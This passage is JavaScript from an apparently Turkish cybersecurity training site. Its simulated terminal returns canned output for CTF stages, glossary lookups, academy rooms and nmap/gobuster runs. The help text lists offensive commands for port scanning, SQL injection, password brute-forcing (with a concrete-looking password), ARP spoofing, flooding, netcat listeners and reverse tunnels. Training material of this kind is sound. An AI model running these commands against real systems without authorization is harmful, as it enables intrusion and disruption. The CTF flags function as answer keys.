                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">Module                  Size  Used by\n<span style="color: #ef4444; font-weight: 800;">lfl_shadow_rk          45056  0  [HIDDEN_LKM_HOOK_SYSCALL_TABLE]</span>\n[  412.88102] lfl_shadow_rk: sys_getdents64 hooked at 0xffffffffc0412000\n<span style="color: #fbbf24;">[+] Gizli çekirdek modülü tespit edildi! Sembolleri inceleyin: nm /lib/modules/kernel/lfl_shadow_rk.ko</span></pre>`;
            }
            if (cleanCliCmd.includes('lfl_shadow_rk.ko') && (cleanCliCmd.includes('nm') || cleanCliCmd.includes('objdump') || cleanCliCmd.includes('radare2') || cleanCliCmd.includes('r2'))) {
                return `<pre style="color: #a7f3d0; font-family: var(--font-mono); font-size: 12px;">0000000000001040 T decrypt_vault_master_key\n00000000000040a0 D xor_cipher_hex_buf\n  mov rdi, 0x4c464c7b6b65726e ; XOR KEY = 0x5A\n<span style="color: #22c55e;">[+] decrypt_vault_master_key fonksiyonu bulundu! Çekirdek kasasını çözmek için: python3 -c "import ctypes; print(\'DECRYPTING_KERNEL_VAULT\')"</span></pre>`;
            }
            if (cleanCliCmd.includes('python3 -c') || cleanCliCmd.includes('decrypt_vault') || cleanCliCmd.includes('kernel_vault')) {
                return `<pre style="color: #34d399; font-family: var(--font-mono); font-size: 12px;">===================================================================\n👑 LFL DEFCON-1 KERNEL ZERO-DAY VAULT DECRYPTED 👑\n===================================================================\nROOTKIT_HOOK_REMOVED : sys_getdents64 restored\nMASTER_OMNISCIENT_KEY: <span style="color: #fbbf24; font-weight: 800; font-size: 14px;">LFL{level5_2_kernel_zeroday_omniscient_god_2026}</span>\n===================================================================\n<span style="color: #00e5ff; font-weight: bold;">🏆 TEBRİKLER! 10 SEVİYELİ CTF ARENASININ NİHAİ FİNAL BAYRAĞI ELE GEÇİRİLDİ!</span></pre>`;
            }

            // D. SİBER KILAVUZ & SÖZLÜK (85+ Terim Analojili Manpage)
            if (cleanCliCmd === 'sozluk' || cleanCliCmd === 'sozluk list' || cleanCliCmd === 'dict' || cleanCliCmd === 'dict list' || cleanCliCmd === 'kilavuz' || cleanCliCmd === 'kılavuz') {
                const gData = (typeof glossaryData !== 'undefined' && Array.isArray(glossaryData)) ? glossaryData : (window.glossaryData || []);
                const termPills = gData.map(item => `<code style="background: rgba(168, 85, 247, 0.15); color: #c084fc; padding: 2px 6px; border-radius: 4px; font-size: 11px; display: inline-block; margin: 2px;">${escapeHtml(item.tag)}</code>`).join(' ');
                return `
<div style="font-family: var(--font-mono); font-size: 12px; line-height: 1.5; border: 1px solid rgba(168, 85, 247, 0.35); background: rgba(15, 10, 30, 0.85); border-radius: 8px; padding: 14px; margin: 8px 0;">
    <div style="color: #c084fc; font-weight: 800; font-size: 13px; margin-bottom: 6px;">📖 SİBER KILAVUZ &amp; SÖZLÜK (TOPLAM ${gData.length}+ KAPSAMLI TERİM)</div>
    <div style="color: #94a3b8; font-size: 11.5px; margin-bottom: 10px;">Herhangi bir terimin analojili ve teknik detayını görmek için terminale <code style="color: #38bdf8;">sozluk &lt;terim&gt;</code> veya doğrudan terimin adını yazın (Örn: <code style="color: #22c55e;">sozluk waf</code>, <code style="color: #22c55e;">honeypot</code>, <code style="color: #22c55e;">siem</code>, <code style="color: #22c55e;">mitm</code>).</div>
    <div style="max-height: 240px; overflow-y: auto; padding-right: 6px; line-height: 1.8;">
        ${termPills}
    </div>
</div>
                `;
            }

            // Check if user is searching glossary via sozluk <query> or man <query> or direct tag
            let glossaryQuery = null;
            if (cleanCliCmd.startsWith('sozluk ') || cleanCliCmd.startsWith('dict ') || cleanCliCmd.startsWith('explain ') || cleanCliCmd.startsWith('kılavuz ') || cleanCliCmd.startsWith('kilavuz ') || cleanCliCmd.startsWith('man ') || cleanCliCmd.startsWith('whatis ')) {
                glossaryQuery = cleanCliCmd.split(' ').slice(1).join(' ').trim();
            } else {
                glossaryQuery = cleanCliCmd;
            }

            if (glossaryQuery) {
                const gData = (typeof glossaryData !== 'undefined' && Array.isArray(glossaryData)) ? glossaryData : (window.glossaryData || []);
                const qClean = glossaryQuery.toLowerCase().replace(/[^a-z0-9]/g, '');
                const foundTerm = gData.find(item => {
                    const tagClean = (item.tag || '').toLowerCase().replace(/[^a-z0-9]/g, '');
                    if (tagClean === qClean) return true;
                    if ((item.tag || '').toLowerCase() === glossaryQuery.toLowerCase()) return true;
                    if (qClean.length >= 3 && tagClean.includes(qClean)) return true;
                    return false;
                });

                if (foundTerm && (cleanCliCmd.startsWith('sozluk') || cleanCliCmd.startsWith('dict') || cleanCliCmd.startsWith('explain') || cleanCliCmd.startsWith('man') || cleanCliCmd.startsWith('whatis') || foundTerm.tag.toLowerCase().replace(/[^a-z0-9]/g, '') === qClean)) {
                    return `
<div class="kali-glossary-card" style="margin: 8px 0; font-family: var(--font-mono); font-size: 12px; line-height: 1.5; border: 1px solid rgba(168, 85, 247, 0.45); background: rgba(15, 10, 30, 0.9); border-radius: 8px; padding: 14px; box-shadow: 0 4px 20px rgba(168, 85, 247, 0.15);">
    <div style="display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(168, 85, 247, 0.25); padding-bottom: 6px; margin-bottom: 8px;">
        <span style="color: #c084fc; font-weight: 800; font-size: 12px;">📖 LFL SİBER KILAVUZ &amp; SÖZLÜK // TERİM DOSYASI</span>
        <span style="background: rgba(168, 85, 247, 0.2); color: #d8b4fe; font-weight: 700; font-size: 11px; padding: 2px 8px; border-radius: 4px; border: 1px solid rgba(168, 85, 247, 0.35);">[${escapeHtml(foundTerm.tag)}]</span>
    </div>
    <div style="color: #ffffff; font-weight: 700; font-size: 13.5px; margin-bottom: 8px;">▶ ${escapeHtml(foundTerm.title)}</div>
    
    <div style="background: rgba(0, 229, 255, 0.06); border-left: 3px solid #00e5ff; padding: 8px 12px; border-radius: 4px; margin: 8px 0; color: #e2e8f0;">
        <div style="color: #38bdf8; font-weight: bold; font-size: 11px; margin-bottom: 3px;">💡 GÜNLÜK HAYATTAN BENZETME (MALA ANLATIR GİBİ):</div>
        <div style="color: #cbd5e1; font-size: 12px;">${escapeHtml(foundTerm.analogy)}</div>
    </div>

    <div style="background: rgba(255, 255, 255, 0.03); border-left: 3px solid #a855f7; padding: 8px 12px; border-radius: 4px; margin: 8px 0; color: #e2e8f0;">
        <div style="color: #c084fc; font-weight: bold; font-size: 11px; margin-bottom: 3px;">🛡️ TEKNİK DERİNLİK &amp; MİMARİ:</div>
        <div style="color: #e2e8f0; font-size: 12px;">${escapeHtml(foundTerm.desc)}</div>
    </div>

    <div style="background: rgba(16, 185, 129, 0.06); border-left: 3px solid #10b981; padding: 8px 12px; border-radius: 4px; margin: 8px 0; color: #e2e8f0;">
        <div style="color: #34d399; font-weight: bold; font-size: 11px; margin-bottom: 3px;">🔒 SAVUNMA &amp; ENGELLEME (MİTİGASYON):</div>
        <div style="color: #a7f3d0; font-size: 12px;">${escapeHtml(foundTerm.mitigates || 'Güvenlik sertleştirmesi ve güncel yamalar.')}</div>
    </div>
</div>
                    `;
                }
            }

            // E. SİBER AKADEMİ ODALARI (69 Oda - Tümü Çalıştırılabilir)
            if (cleanCliCmd === 'rooms' || cleanCliCmd === 'rooms list' || cleanCliCmd === 'odalar' || cleanCliCmd === 'oda listesi') {
                if (window.ACADEMY_ROOMS && Array.isArray(window.ACADEMY_ROOMS)) {
                    const tracks = { starter: [], red: [], blue: [], purple: [] };
                    window.ACADEMY_ROOMS.forEach(r => {
                        if (tracks[r.track]) tracks[r.track].push(r);
                    });
                    return `
<pre style="color: #38bdf8; font-family: var(--font-mono); font-size: 12px; line-height: 1.5;">
[★] ======================================================================
[★] LFL SİBER AKADEMİ GÖREV ODALARI (TOPLAM ${window.ACADEMY_ROOMS.length} ODA)
[★] ======================================================================
🌱 STARTER TRACK (18 Oda)  : starter-01 ... starter-18
⚔️ RED TEAM (20 Oda)       : red-101 ... red-312
🛡️ BLUE TEAM (17 Oda)      : blue-101 ... blue-311
🔮 PURPLE TEAM (14 Oda)    : purple-101 ... purple-310

[!] KULLANIM İPUCU:
  1) Belirli bir odayı çalıştırmak için: <code style="color: #00e5ff;">room starter-01</code> veya <code style="color: #00e5ff;">room red-101</code>
  2) Odanın doğrudan kendi komutunu yazabilirsiniz (Örn: <code style="color: #22c55e;">ip a</code>, <code style="color: #22c55e;">mimikatz</code>, <code style="color: #22c55e;">tcpdump</code>)
  3) Odayı tamamladığınızda bayrak otomatik kazanılır ve ilerlemeniz kaydedilir!
======================================================================
</pre>
                    `;
                }
            }

            // Check if user types "room <id>" or "oda <id>"
            let targetRoomId = null;
            if (cleanCliCmd.startsWith('room ') || cleanCliCmd.startsWith('oda ') || cleanCliCmd.startsWith('run room-') || cleanCliCmd.startsWith('run starter-') || cleanCliCmd.startsWith('run red-') || cleanCliCmd.startsWith('run blue-') || cleanCliCmd.startsWith('run purple-')) {
                targetRoomId = cleanCliCmd.replace(/^(room|oda|run)\s+/, '').trim().toLowerCase();
            }

            if (window.ACADEMY_ROOMS && Array.isArray(window.ACADEMY_ROOMS)) {
                let matchedRoom = null;

                // 1. Matched by ID
                if (targetRoomId) {
                    matchedRoom = window.ACADEMY_ROOMS.find(r => r.id.toLowerCase() === targetRoomId);
                }

                // 2. Matched by acceptedCommands or expectedCommand
                if (!matchedRoom) {
                    matchedRoom = window.ACADEMY_ROOMS.find(r => {
                        if (r.expectedCommand && r.expectedCommand.toLowerCase().trim() === cleanCliCmd) return true;
                        if (Array.isArray(r.acceptedCommands)) {
                            return r.acceptedCommands.some(ac => {
                                const acClean = ac.toLowerCase().trim().replace(/^sudo\s+/, '').replace(/\s+/g, ' ');
                                return acClean === cleanCliCmd || ac.toLowerCase().trim() === lower;
                            });
                        }
                        return false;
                    });
                }

                if (matchedRoom) {
                    markRoomCompletedInStorage(matchedRoom.id);
                    return `
<div class="kali-room-exec-card" style="margin: 8px 0; font-family: var(--font-mono); font-size: 12px; line-height: 1.5; border: 1px solid rgba(0, 229, 255, 0.4); background: rgba(5, 15, 30, 0.85); border-radius: 8px; padding: 12px 14px; box-shadow: 0 4px 20px rgba(0, 229, 255, 0.12);">
    <div style="display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(0, 229, 255, 0.2); padding-bottom: 6px; margin-bottom: 8px;">
        <div style="display: flex; align-items: center; gap: 8px;">
            <span style="display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #10b981; box-shadow: 0 0 8px #10b981;"></span>
            <span style="color: #38bdf8; font-weight: 800; font-size: 12px;">🛡️ LFL SİBER AKADEMİ GÖREV SİMÜLASYONU</span>
        </div>
        <span style="background: rgba(16, 185, 129, 0.15); color: #34d399; font-weight: 700; font-size: 11px; padding: 2px 8px; border-radius: 4px; border: 1px solid rgba(16, 185, 129, 0.3);">${escapeHtml(matchedRoom.badge || matchedRoom.track.toUpperCase() + ' TEAM')}</span>
    </div>
    <div style="color: #ffffff; font-weight: 700; font-size: 13px; margin-bottom: 4px;">ODA ${escapeHtml(matchedRoom.id.toUpperCase())}: ${escapeHtml(matchedRoom.title)}</div>
    <div style="color: #94a3b8; font-size: 11.5px; margin-bottom: 8px;">🎯 <strong>Görev Yönergesi:</strong> ${escapeHtml(matchedRoom.mission)}</div>
    
    <div style="background: #020617; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 6px; padding: 10px 12px; color: #a7f3d0; font-size: 11.5px; white-space: pre-wrap; word-break: break-all; margin: 8px 0; line-height: 1.45;">${escapeHtml(matchedRoom.terminalSuccessOutput || matchedRoom.terminalOutput || '[✔] Görev komutu başarıyla icra edildi.')}</div>

    <div style="background: rgba(251, 191, 36, 0.08); border: 1px dashed rgba(251, 191, 36, 0.35); border-radius: 6px; padding: 8px 12px; margin-top: 8px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px;">
        <div>
            <span style="color: #fbbf24; font-weight: 800; font-size: 11.5px;">🚩 TEBRİKLER! ODA BAYRAĞI ELE GEÇİRİLDİ:</span>
            <code style="background: rgba(0, 0, 0, 0.5); color: #fde047; padding: 3px 8px; border-radius: 4px; font-weight: bold; margin-left: 6px; border: 1px solid rgba(251, 191, 36, 0.4);">${escapeHtml(matchedRoom.flag)}</code>
        </div>
        <a href="academy.html?room=${escapeHtml(matchedRoom.id)}" target="_blank" style="color: #38bdf8; font-size: 11.5px; text-decoration: underline; font-weight: 600;">Akademi Laboratuvarında Aç &rarr;</a>
    </div>
</div>
                    `;
                }
            }

            // F. 143+ SİBER KOMUT MOTORU (window.ACADEMY_COMMANDS)
            if (window.ACADEMY_COMMANDS && Array.isArray(window.ACADEMY_COMMANDS)) {
                const foundCmd = window.ACADEMY_COMMANDS.find(c => {
                    const cClean = c.cmd.toLowerCase().trim().replace(/^sudo\s+/, '').replace(/^powershell\s+/, '').replace(/^\.\//, '').replace(/^\\/, '').replace(/\s+/g, ' ');
                    if (cClean === cleanCliCmd || c.cmd.toLowerCase().trim() === lower) return true;
                    const cFirst = cClean.split(' ')[0] || '';
                    const uFirst = cleanCliCmd.split(' ')[0] || '';
                    if (uFirst && (uFirst === cFirst) && cleanCliCmd.length <= cClean.length + 5) return true;
                    return false;
                });

                if (foundCmd && !cleanCliCmd.startsWith('nmap') && !cleanCliCmd.startsWith('hydra') && !cleanCliCmd.startsWith('gobuster') && !cleanCliCmd.startsWith('sqlmap')) {
                    return `
<div style="font-family: var(--font-mono); font-size: 12px; line-height: 1.5; margin: 6px 0; border: 1px solid rgba(0, 229, 255, 0.3); background: rgba(5, 15, 30, 0.7); border-radius: 6px; padding: 10px 12px;">
    <div style="color: #38bdf8; font-weight: 700;">[⚙️] EXEC: <code style="color: #ffffff; font-weight: 800;">${escapeHtml(rawCmd)}</code></div>
    <div style="color: #64748b; font-size: 10.5px; margin-bottom: 6px;">Kategori: <span style="color: #a5f3fc;">${escapeHtml(foundCmd.categoryName)}</span> &bull; <span style="color: #22c55e;">[${escapeHtml(foundCmd.badge)}]</span> &bull; Durum: 200 OK &bull; PID: ${Math.floor(1000 + Math.random() * 9000)}</div>
    <div style="background: rgba(0, 0, 0, 0.45); border-left: 3px solid var(--cyan); padding: 8px 12px; border-radius: 4px; margin: 6px 0; color: #e2e8f0;">
        <div style="color: #38bdf8; font-weight: bold; margin-bottom: 4px;">▶ ${escapeHtml(foundCmd.title)}</div>
        <div style="color: #cbd5e1; font-size: 11.5px;">${escapeHtml(foundCmd.desc)}</div>
    </div>
    <div style="color: #10b981; font-size: 11px;">[✔] Komut simülasyonu başarıyla yürütüldü. (Siber Akademi modülünde daha fazla pratik yapabilirsiniz)</div>
</div>
                    `;
                }
            }



            // 1. HELP
            if (lower === 'help' || lower === '?') {
                return `
<span style="color: #38bdf8; font-weight: bold;">=== KALI LINUX &amp; LFL SİBER SAVUNMA KOMUT KÜTÜPHANESİ (140+ ARAÇ) ===</span>

<span style="color: #22c55e; font-weight: bold;">[AĞ &amp; PORT TARAMA - NMAP]:</span>
  nmap -p- 127.0.0.1           : Tüm 65,535 portu SYN stealth taramasıyla inceler
  nmap 8080/tcp                 : Belirli bir portun durumunu ve servisini kontrol eder
  nmap -F 192.168.1.1           : En yaygın 100 portu ultra hızlı tarar
  sudo nmap -sn 192.168.1.0/24  : Yerel ağdaki tüm aktif istemcileri ping taramasıyla listeler
  sudo nmap -O 192.168.1.17     : Hedef cihazın işletim sistemini (OS Fingerprinting) tahmin eder
  nmap -Pn 192.168.1.1          : Ping cevap vermeyen gizli sunucuları taramaya zorlar
  nmap -sV 127.0.0.1            : Çalışan servislerin adını ve tam versiyonunu deşifre eder
  sudo nmap -sV -p 5000,7000... : Birden fazla spesifik portun servis detaylarını çıkarır
  nmap -sS -T2 192.168.1.1      : IDS/IPS yakalamasını engellemek için sessiz ve yavaş tarama
  nmap --script vuln 192.168.1.1: NSE zafiyet veritabanı taraması
  nmap -sU -p 53,67,123...      : UDP servislerini denetler

<span style="color: #22c55e; font-weight: bold;">[WEB DİZİN &amp; FUZZING &amp; OSINT]:</span>
  whois lostfromlight.com                       : Alan adı sahiplik ve DNS kayıtlarını sorgular
  dig lostfromlight.com                         : DNS A ve NS kayıtlarını çözer
  gobuster dir -u http://127.0.0.1 -w common.txt: Web sitesindeki gizli dizinleri (/admin, /backup) bulur
  ffuf -u http://127.0.0.1/FUZZ -w common.txt   : Yüksek hızlı web fuzzer ile parametre ve rotaları ortaya çıkarır
  nikto -h 192.168.1.1                          : Web sunucusundaki zafiyetleri ve güvenlik başlıklarını tarar
  whatweb http://127.0.0.1                      : Web teknolojilerini (CMS, web server, kütüphaneler) listeler
  dirb http://127.0.0.1                         : Klasik içerik keşif aracı
  wfuzz -c -z file,common.txt --hc 404 ...      : Gelişmiş filtreli fuzzer
  sublist3r -d lfl.local                        : Alt alan adlarını (subdomain) keşfeder

<span style="color: #22c55e; font-weight: bold;">[PAKET ÜRETİMİ &amp; FIREWALL TESTİ]:</span>
  sudo hping3 -S -p 80 -c 1 192.168.1.1   : Manuel TCP SYN paketiyle açık port doğrulaması
  sudo hping3 -A -p 80 -c 1 192.168.1.1   : ACK bayrağıyla güvenlik duvarının (Firewall) tepkisini ölçer
  hping3 -S -p 22 127.0.0.1               : Belirli porta TCP SYN gönderir
  hping3 -1 127.0.0.1                     : Hedefe ICMP ping yollar
  sudo hping3 --udp --flood ...           : DoS / Flood dayanıklılık testi simülasyonu

<span style="color: #22c55e; font-weight: bold;">[ORTADAKİ ADAM (MITM) &amp; AĞ ANALİZİ]:</span>
  bettercap -iface lo                     : Dinleme ve paket analiz aracı
  tcpdump -i eth0 -nn -s0 -v              : Ham ağ paketlerini canlı yakalar
  tshark -i 1 -Y "http.request"           : Terminal tabanlı Wireshark filtreleyicisi
  arpspoof -i eth0 -t 192.168.1.17...     : ARP zehirleme simülasyonu
  responder -I eth0 -dwv                  : LLMNR/NBT-NS zehirleme analizörü

<span style="color: #22c55e; font-weight: bold;">[KİMLİK DOĞRULAMA &amp; ŞİFRE DENETİMİ]:</span>
  hydra -l admin -p Sebu132009 192.168.1.1 http-get / : HTTP GET form giriş şifresini test eder
  john --wordlist=rockyou.txt hash.txt                 : Parola özetlerini (hash) çözer
  hashcat -m 0 -a 0 hash.txt rockyou.txt              : GPU destekli hash kırıcı
  cewl https://127.0.0.1 -w wordlist.txt               : Siteden özel kelime listesi üretir

<span style="color: #22c55e; font-weight: bold;">[ZAFİYET &amp; EXPLOIT DENETİMİ]:</span>
  sqlmap -u http://127.0.0.1/api/search?q=test --dbs   : Otomatik SQL enjeksiyon testi
  searchsploit apache 2.4.49                           : Offline Exploit-DB arşivi
  nuclei -u http://127.0.0.1                           : Şablon tabanlı zafiyet tarayıcı
  msfconsole -q                                        : Metasploit Framework konsolu

<span style="color: #22c55e; font-weight: bold;">[TÜNEL &amp; PIVOTİNG]:</span>
  nc -lvnp 4444                                        : Netcat port dinleyicisi
  socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80          : Çift yönlü soket köprüsü
  chisel server -p 8000 --reverse                      : TCP/UDP HTTP tüneli
  ssh -D 1080 -q -C -N user@127.0.0.1                  : SOCKS5 tüneli kurar

<span style="color: #22c55e; font-weight: bold;">[POWERSHELL &amp; DEFANS]:</span>
  powershell .\\Audit-Headers.ps1                      : Zorunlu web güvenlik başlıklarını doğrular
  powershell .\\Port-Scan.ps1                          : Çok kanallı runspace port taraması yapar
  powershell .\\Banner-Grab.ps1                        : Sunucu banner gizleme denetimi

<span style="color: #94a3b8;">Komut geçmişinde gezinmek için [YUKARI/AŞAĞI OK], otomatik tamamlamak için [TAB] tuşuna basın. Temizlemek için 'clear' yazın.</span>
                `;
            }

            // 2. POWERSHELL AUDIT HEADERS
            if (lower.includes('audit-headers') || lower.includes('strict-transport-security') || lower.includes('headers')) {
                return `
<span style="color: #00e5ff; font-weight: bold;">=== GÜVENLİK BAŞLIĞI DENETİM RAPORU (PowerShell Invoke-WebRequest) ===</span>
<span style="color: #94a3b8;">Hedef: https://localhost:5000</span>

<span style="color: #22c55e;">[✔] GÜVENLİ: 'Strict-Transport-Security' (HSTS) başlığı tanımlanmış.</span>
    <span style="color: #94a3b8;">Değer: max-age=31536000; includeSubDomains; preload</span>

<span style="color: #22c55e;">[✔] GÜVENLİ: 'Content-Security-Policy' (CSP) başlığı tanımlanmış.</span>
    <span style="color: #94a3b8;">Değer: default-src 'self'; script-src 'self' 'unsafe-inline'</span>

<span style="color: #22c55e;">[✔] GÜVENLİ: 'X-Frame-Options' başlığı tanımlanmış.</span>
    <span style="color: #94a3b8;">Değer: DENY (Clickjacking Korumalı)</span>

<span style="color: #22c55e;">[✔] GÜVENLİ: 'X-Content-Type-Options' başlığı tanımlanmış.</span>
    <span style="color: #94a3b8;">Değer: nosniff (MIME Confuse Saldırısı Engellendi)</span>

<span style="color: #22c55e;">[✔] GÜVENLİ: 'Referrer-Policy' başlığı tanımlanmış.</span>
    <span style="color: #94a3b8;">Değer: strict-origin-when-cross-origin</span>

<span style="color: #22c55e; font-weight: bold;">Sonuç: Sunucu %100 SOC2 ve ISO 27001 kurumsal standartlarına uygundur!</span>
                `;
            }

            // 3. POWERSHELL PORT SCAN
            if (lower.includes('port-scan') || lower.includes('runspace')) {
                return `
<span style="color: #c084fc; font-weight: bold;">=== MULTI-THREAD (RUNSPACE POOL) PORT TARAMA RAPORU ===</span>
<span style="color: #94a3b8;">Hedef Sistem: 127.0.0.1</span>
<span style="color: #94a3b8;">Eşzamanlı İş Parçacığı: 16 Core RunspacePool</span>

Port 21   (FTP)       : <span style="color: #64748b;">Kapalı</span>
Port 22   (SSH)       : <span style="color: #64748b;">Kapalı</span>
Port 25   (SMTP)      : <span style="color: #64748b;">Kapalı</span>
Port 53   (DNS)       : <span style="color: #64748b;">Kapalı</span>
Port 80   (HTTP)      : <span style="color: #22c55e; font-weight: bold;">AÇIK</span> [LFL Kestrel Proxy]
Port 443  (HTTPS)     : <span style="color: #22c55e; font-weight: bold;">AÇIK</span> [TLS 1.3 / Strict-Transport-Security]
Port 445  (SMB)       : <span style="color: #64748b;">Kapalı</span> (Fidye Yazılımı Kalkanı)
Port 3389 (RDP)       : <span style="color: #64748b;">Kapalı</span> (Uzaktan Masaüstü Kilitli)
Port 5000 (LFL-API)   : <span style="color: #22c55e; font-weight: bold;">AÇIK</span> [ASP.NET Core 8 Web API]
Port 8080 (Dev-Proxy) : <span style="color: #22c55e; font-weight: bold;">AÇIK</span> [Kısıtlı Geliştirici Tüneli]

<span style="color: #22c55e;">Tarama 0.38 saniyede tamamlandı. 16 Runspace başarıyla kapatıldı.</span>
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: SMB (445) ve RDP (3389) tamamen kapalı tutulmalıdır.</span>
                `;
            }

            // 4. NMAP -P-
            if (lower.includes('nmap') && lower.includes('-p-')) {
                return `
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-08 00:00 UTC
Initiating SYN Stealth Scan at 00:00
Scanning localhost (127.0.0.1) [65535 ports]
Discovered open port 80/tcp on 127.0.0.1
Discovered open port 443/tcp on 127.0.0.1
Discovered open port 5000/tcp on 127.0.0.1
Discovered open port 8080/tcp on 127.0.0.1
Completed SYN Stealth Scan at 00:00, 3.82s elapsed (65535 total ports)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000082s latency).
Not shown: 65531 closed tcp ports (reset)

<span style="color: #38bdf8; font-weight: bold;">PORT     STATE SERVICE      REASON</span>
80/tcp   <span style="color: #22c55e;">open</span>  http         syn-ack ttl 64 (LFL Kestrel Proxy)
443/tcp  <span style="color: #22c55e;">open</span>  https        syn-ack ttl 64 (TLS 1.3 / HSTS Strict)
5000/tcp <span style="color: #22c55e;">open</span>  lfl-api      syn-ack ttl 64 (ASP.NET Core Web API)
8080/tcp <span style="color: #22c55e;">open</span>  http-proxy   syn-ack ttl 64 (Dev Gateway)

Nmap done: 1 IP address (1 host up) scanned in 3.89 seconds
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: -p- bayrağı tüm 65,535 portu denetleyerek hiçbir gölge servisin (Shadow IT) unutulmamasını sağlar.</span>
                `;
            }

            // 5. NMAP 8080
            if (lower.includes('nmap') && lower.includes('8080')) {
                return `
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-08 00:01 UTC
Nmap scan report for 127.0.0.1
Host is up (0.000078s latency).

<span style="color: #38bdf8; font-weight: bold;">PORT     STATE SERVICE    VERSION</span>
8080/tcp <span style="color: #22c55e;">open</span>  http-proxy LFL Enterprise API (Zero-Trust Shield Enforced)

<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: 8080 alternatif web portudur. Üretim ortamında Kestrel güvenlik middleware'i ve JWT Bearer doğrulaması olmadan dış dünyaya açılmamalıdır.</span>
                `;
            }

            // 6. NMAP -F
            if (lower.includes('nmap') && lower.includes('-f') && !lower.includes('-p')) {
                return `
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-08 00:02 UTC
Nmap scan report for 192.168.1.1 (Gateway Router)
Host is up (0.0012s latency).
Not shown: 97 closed tcp ports (reset)

<span style="color: #38bdf8; font-weight: bold;">PORT    STATE SERVICE</span>
53/tcp  <span style="color: #22c55e;">open</span>  domain (DNS Resolver)
80/tcp  <span style="color: #22c55e;">open</span>  http (Web Management UI)
443/tcp <span style="color: #22c55e;">open</span>  https (TLS Management)

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: -F parametresi en yaygın 100 portu saniyeler içinde tarayarak hızlı ilk keşif yapılmasını sağlar.</span>
                `;
            }

            // 7. NMAP -SN
            if (lower.includes('nmap') && lower.includes('-sn')) {
                return `
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-08 00:03 UTC
Nmap scan report for 192.168.1.1 (Gateway / Modem)
Host is up (0.00084s latency). MAC Address: 00:1A:2B:3C:4D:5E (Cisco-Linksys)
Nmap scan report for 192.168.1.17 (Workstation)
Host is up (0.00021s latency). MAC Address: 34:97:F6:11:22:33 (Dell Inc.)
Nmap scan report for 192.168.1.22 (LFL Security Node)
Host is up (0.00009s latency). MAC Address: 52:54:00:12:34:56 (QEMU Virtual NIC)
Nmap scan report for 192.168.1.105 (Mobile Client)
Host is up (0.014s latency). MAC Address: 88:66:5A:99:88:77 (Apple Inc.)

Nmap done: 256 IP addresses (4 hosts up) scanned in 0.89 seconds
<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Port taraması yapmadan yalnızca ICMP ping ile yerel alt ağdaki aktif cihazları haritalandırır.</span>
                `;
            }

            // 8. NMAP -O
            if (lower.includes('nmap') && lower.includes('-o')) {
                return `
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-08 00:04 UTC
Nmap scan report for 192.168.1.17
Host is up (0.00034s latency).
Device type: general purpose
Running: <span style="color: #22c55e; font-weight: bold;">Microsoft Windows 11 / Server 2022 (98%)</span>
OS CPE: cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 11 23H2 (Build 22631)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)

<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: İşletim sistemi parmak izi çıkarma, TCP/IP yığınındaki TTL ve Window Size tepkilerini inceler. Güvenlik duvarından rastgele TCP ISN üretimi zorunlu tutulmalıdır.</span>
                `;
            }

            // 9. NMAP -PN
            if (lower.includes('nmap') && lower.includes('-pn')) {
                return `
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-08 00:05 UTC
Host discovery disabled (-Pn). All addresses specified will be assumed to be up.
Nmap scan report for 192.168.1.1
Host is up.
<span style="color: #38bdf8; font-weight: bold;">PORT    STATE SERVICE</span>
80/tcp  <span style="color: #22c55e;">open</span>  http
443/tcp <span style="color: #22c55e;">open</span>  https

<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Ping (ICMP Echo) yanıtlarını engelleyen güvenlik duvarlarının arkasındaki sunucuları taramak için -Pn kullanılır.</span>
                `;
            }

            // 10. NMAP -SV
            if (lower.includes('nmap') && lower.includes('-sv')) {
                return `
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-08 00:06 UTC
Nmap scan report for 192.168.1.17
<span style="color: #38bdf8; font-weight: bold;">PORT      STATE  SERVICE       VERSION</span>
5000/tcp  <span style="color: #22c55e;">open</span>   http          Kestrel (ASP.NET Core 8.0 - Hardened)
7000/tcp  closed afs3-fileserver
7100/tcp  closed font-service
49152/tcp <span style="color: #22c55e;">open</span>   upnp          Supermicro IPMI / MiniUPnPd 1.9
62078/tcp <span style="color: #22c55e;">open</span>   tcpwrapped    Encrypted Internal RPC

<span style="color: #38bdf8;">[DEFENSIVE TAKEAWAY]: Servis versiyon tespile güncel olmayan veya yama almamış kütüphaneler (CVE) hızla tespit edilir.</span>
                `;
            }

            // 11. GOBUSTER
            if (lower.includes('gobuster')) {
                return `
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.1
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
<span style="color: #ef4444;">/admin                (Status: 403) [Size: 154]</span>
<span style="color: #22c55e;">/api                  (Status: 200) [Size: 1420]</span>
<span style="color: #22c55e;">/login                (Status: 200) [Size: 840]</span>
<span style="color: #22c55e;">/dashboard            (Status: 200) [Size: 3100]</span>
<span style="color: #38bdf8;">/robots.txt           (Status: 200) [Size: 64]</span>
===============================================================
Finished. 4,614 requests dispatched in 1.42s.
